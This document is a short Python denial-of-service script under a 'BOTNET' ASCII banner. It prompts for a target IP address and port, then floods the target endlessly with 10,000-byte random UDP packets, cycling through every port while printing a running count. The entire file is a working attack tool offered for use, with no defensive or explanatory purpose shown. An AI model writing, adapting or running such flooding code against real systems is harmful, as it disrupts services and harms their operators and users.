#!/usr/bin/env python3

import sys
import os
import time
import socket
import random
from datetime import datetime

# Get the current date and time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Settings
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_to_send = random._urandom(10000)
timeout = time.time()

# Clear the terminal screen
os.system("clear")

# Print the banner
print('''
\033[91m
      :::::::::       ::::::::   :::::::::::       ::::    :::       ::::::::::   ::::::::::: 
     :+:    :+:     :+:    :+:      :+:           :+:+:   :+:       :+:              :+:      
    +:+    +:+     +:+    +:+      +:+           :+:+:+  +:+       +:+              +:+       
   +#++:++#+      +#+    +:+      +#+           +#+ +:+ +#+       +#++:++#         +#+        
  +#+    +#+     +#+    +#+      +#+           +#+  +#+#+#       +#+              +#+         
 #+#    #+#     #+#    #+#      #+#           #+#   #+#+#       #+#              #+#          
#########       ########       ###           ###    ####       ##########       ###           
                               \033[92m[\033[91mPowered By : Codename\033[92m]
                               \033[93m[\033[94m127.0.0.1\033[93m]\033[95m|_|\033[93m[\033[94m127.217.21.78\033[93m]                                                                         
''')

# Input the target IP address and port
ip = input("IP Target: ")
port = int(input("Port: "))

# Clear the terminal screen
os.system("clear")
print("\033[91mMission Start DDOS")

# Print loading progress
for i in range(5):
    print(f"\033[91m[{i * 20 * '='}] {i * 25}% ")
    time.sleep(5)

print("\033[92m[====================] 100%")
time.sleep(3)
os.system("clear")

sent = 0
while True:
    while True:
        if time.time() > timeout:
            break
        else:
            pass

    sock.sendto(bytes_to_send, (ip, port))
    sent += 1
    port += 1
    print(f"\033[92mSent {sent} packet to {ip} through port: {port} successful")
    
    if port == 65534:
        port = 1
